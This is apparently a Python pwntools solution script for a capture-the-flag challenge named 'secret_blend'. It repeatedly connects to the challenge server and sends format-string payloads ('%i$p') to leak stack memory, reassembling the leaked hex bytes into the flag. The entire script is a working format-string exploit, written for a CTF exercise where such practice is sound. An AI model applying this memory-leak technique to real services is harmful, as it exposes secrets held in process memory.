#!/usr/bin/env python3

from pwn import *

exe = ELF("./secret_blend", checksec=False)
context.binary = exe

flag = b''
for i in range(6, 20):
	# p = process(exe.path)
	p = remote("chals1.apoorvctf.xyz", 3003)
	# input()
	p.sendlineafter(b'\n', f'%{i}$p')
	output = p.recvall().decode(errors='ignore').strip()

	if '0x' in output:
		hex_value = output.split('0x')[-1]
		try:
			flag += bytes.fromhex(hex_value)[::-1]
		except ValueError:
			pass
	p.close()

	if b'}' in flag:
		print(flag.decode())
		exit()

p.interactive()